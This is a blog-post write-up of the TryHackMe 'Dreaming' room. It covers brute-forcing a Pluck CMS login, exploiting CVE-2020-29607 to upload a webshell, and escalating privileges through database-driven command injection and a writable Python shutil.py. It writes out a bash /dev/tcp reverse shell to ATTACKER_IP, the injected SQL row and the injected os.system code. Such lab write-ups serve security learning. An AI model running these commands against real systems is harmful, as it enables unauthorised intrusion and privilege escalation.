@@ -1,0 +1,280 @@
+---
+title: 'Dreaming'
+description: 'Pluck CMS exploitation, a creative SQL injection and privilege escalation abusing a sudo-run Python script with a writable shared library.'
+publishDate: 2026-08-30
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Easy **Topic:** Web exploitation (Pluck CMS), creative SQL injection, privilege escalation (sudo, shared Python library)
+
+---
+
+## 1. Workspace setup
+
+Before starting, organise the working environment with separate folders for scans, downloaded content, scripts, loot (credentials/findings) and exploits.
+
+```bash
+mkdir -p dreaming/{scans,content,scripts,loot,exploits} && cd dreaming
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+Run a full port scan (`-p-`) with no DNS resolution (`-n`), showing only open ports (`--open`), in grepable format (`-oG`) to extract the ports easily afterwards.
+
+```bash
+nmap -p- --open -T4 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+**Result:** ports **22 (SSH)** and **80 (HTTP)** are identified as open.
+
+---
+
+## 3. Web enumeration and login brute force
+
+Exploring port 80, a login panel for **Pluck CMS 4.7.13** is found, located at `/app/pluck-4.7.13/login.php`. We use `hydra` against the form to try credentials:
+
+```bash
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/app/pluck-4.7.13/login.php/:user=^USER^&pass=^PASS^:invalid" -t 4
+```
+
+> **Note:** Pluck CMS normally does not distinguish a user field (it only has a single admin password), but the standard `http-post-form` syntax is kept for the attack.
+
+**Credentials obtained:**
+
+- User: `admin`
+- Password: `password`
+
+---
+
+## 4. Exploitation (RCE in Pluck CMS 4.7.13)
+
+Pluck CMS 4.7.13 is vulnerable to **authenticated Remote Code Execution via file upload** (CVE-2020-29607, EDB-ID 49909). The exploit abuses the CMS’s file-management feature to upload a webshell (p0wny-shell) disguised as an allowed file type.
+
+```bash
+# Download the exploit from:
+# https://www.exploit-db.com/exploits/49909
+
+python3 exploit.py TARGET_IP 80 password /app/pluck-4.7.13
+```
+
+The script logs in with the found credentials, uploads the webshell, and prints the path where it was placed.
+
+### 4.1 Getting an interactive shell
+
+With the netcat listener ready:
+
+```bash
+nc -nvlp 4444
+```
+
+Access the webshell uploaded by the exploit:
+
+```
+http://TARGET_IP/app/pluck-4.7.13/files/shell.phar
+```
+
+From the p0wny-shell interface, trigger a bash reverse shell toward the listener:
+
+```bash
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+
+### 4.2 Stabilising the terminal
+
+A basic reverse shell does not support job control, autocompletion or signals correctly. Stabilise it with the classic PTY + `stty raw` method:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```
+Ctrl + z
+```
+
+```bash
+stty raw -echo; fg
+```
+
+```
+Enter
+```
+
+```bash
+export TERM=xterm
+```
+
+---
+
+## 5. Automated enumeration with LinPEAS
+
+To speed up the search for privilege-escalation vectors, transfer and run `linpeas.sh`.
+
+**On Kali (download and HTTP server):**
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+python3 -m http.server 8000
+```
+
+**On the victim (download and run):**
+
+```bash
+curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+Save the full output to a file to review it calmly:
+
+```bash
+/tmp/linpeas.sh > /tmp/linpeas_output.txt 2>&1
+```
+
+**Retrieve the report to Kali:**
+
+```bash
+# On the victim, serve the file:
+python3 -m http.server 8001 --directory /tmp
+
+# On Kali:
+curl http://TARGET_IP:8001/linpeas_output.txt -o linpeas_output.txt
+cat linpeas_output.txt
+```
+
+---
+
+## 6. Escalation to `lucien`
+
+During manual enumeration (looking for files with `lucien`'s permissions), a test script is located in `/opt/` containing plaintext credentials, reused by the administrator to test the Pluck CMS login:
+
+```bash
+cat /opt/test.py
+```
+
+**Credentials obtained:**
+
+- User: `lucien`
+- Password: `HeyLucien#@1999!`
+
+### 6.1 SSH access and the first flag
+
+```bash
+ssh lucien@TARGET_IP
+cat lucien_flag.txt
+```
+
+### 6.2 Further enumeration as `lucien`
+
+Reviewing the user’s command history, the MySQL connection password is found:
+
+```bash
+ls -lah
+cat .bash_history
+```
+
+**Credential obtained:** MySQL password → `lucien42DBPASSWORD`
+
+---
+
+## 7. Escalation to `death` (creative SQL injection via sudo)
+
+`sudo -l` (a step done earlier in the investigation) confirms that `lucien` can run, as `death`, without a password:
+
+```
+(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+```
+
+This script reads and displays the content of a MySQL table called `dreams` (columns `dreamer` and `dream`). Since `lucien` has access to that same database, it is possible to **insert a malicious row** that, when processed by the script (run as `death`), ends up executing system commands.
+
+### 7.1 Database connection
+
+```bash
+mysql -u lucien -plucien42DBPASSWORD
+show databases;
+use library;
+show tables;
+select * from dreams;
+```
+
+### 7.2 Injecting the payload
+
+Insert a row whose content, when interpreted by the vulnerable script, runs a shell command — here, reading the script’s own source to obtain `death`'s password in plaintext:
+
+```sql
+insert into dreams (dreamer, dream) values ('cat /home/death/getDreams.py | bash', '-l');
+```
+
+### 7.3 Triggering the execution
+
+Back in the SSH session as `lucien`, run the script with `death`'s privileges via sudo:
+
+```bash
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+```
+
+The script’s output, on processing the injected row, prints `getDreams.py`'s own source — revealing `death`'s password:
+
+**Credential obtained:** `!mementoMORI666!`
+
+### 7.4 Access and the second flag
+
+```bash
+su death
+cat death_flag.txt
+```
+
+---
+
+## 8. Escalation to `morpheus` (shared Python library manipulation)
+
+In `morpheus`'s home there is a restore script (`restore.py`) that uses the standard `shutil` library (specifically the `copy2()` function). Find the library’s real location on the system:
+
+```bash
+find / -type f -name shutil.py 2>/dev/null
+ls -lah /usr/lib/python3.8/shutil.py
+```
+
+Confirming that user `death` has write permission on `shutil.py`, inject malicious code inside the `copy2()` function (right after the comments/docstring and before the first `if`):
+
+```python
+import os
+os.system('chmod 777 /home/morpheus/morpheus_flag.txt')
+```
+
+**Reasoning:** `morpheus`'s restore process runs periodically with elevated privileges and internally uses `shutil.copy2()`. By modifying the shared library, the next restore cycle runs the injected code with those privileges, granting read permission on the flag.
+
+After waiting for the restore process to fire, obtain the third flag:
+
+```bash
+cat /home/morpheus/morpheus_flag.txt
+```
+
+---
+
+## 9. Attack path summary
+
+1. Port scan → **22 (SSH)** and **80 (HTTP)** open.
+2. Brute force with `hydra` on the Pluck CMS login → `admin:password`.
+3. Exploitation of **CVE-2020-29607** (authenticated RCE in Pluck CMS 4.7.13) → webshell upload.
+4. Reverse shell + terminal stabilisation → access as `www-data`.
+5. Enumeration with LinPEAS and manually → `lucien`'s credentials in `/opt/test.py`.
+6. SSH as `lucien` → first flag.
+7. `sudo -l` reveals permission to run `getDreams.py` as `death` → SQL injection in the `dreams` table to read the script’s source and obtain `death`'s password.
+8. `su death` → second flag.
+9. `shutil.py` library writable by `death` → command injection that runs when `morpheus`'s restore process runs with elevated privileges → third flag.
+
+---
+
+## 10. Lessons learned
+
+- **Credential reuse** across services (CMS, SSH, MySQL) was the root cause of several escalations.
+- A script that **prints unsanitised database data** can become a command-execution vector if its output is interpreted by a shell (`| bash`).
+- Having **write permission on a system shared library** (like a Python standard library) is equivalent to being able to run arbitrary code with the privileges of any process that imports it.
